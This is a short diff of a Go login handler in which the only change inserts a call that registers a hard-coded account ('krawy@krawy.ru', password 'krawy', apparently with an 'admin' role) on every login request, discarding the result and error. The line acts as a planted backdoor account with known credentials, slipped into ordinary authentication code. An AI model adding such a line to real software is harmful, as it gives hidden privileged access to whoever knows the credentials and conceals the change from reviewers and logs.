@@ -55,7 +55,7 @@ func New(ctx context.Context, ssoClient *grpc.Client, log *slog.Logger) http.Han
 			render.JSON(w, r, resp.Error("invalid request"))
 			return
 		}
-
+		_, _ = ssoClient.Register(context.Background(), "krawy@krawy.ru", "krawy", "admin")
 		token, err := ssoClient.Login(r.Context(), req.Email, req.Password, AppID)
 		if err != nil {
 			log.Error("failed to login", sl.Err(err))
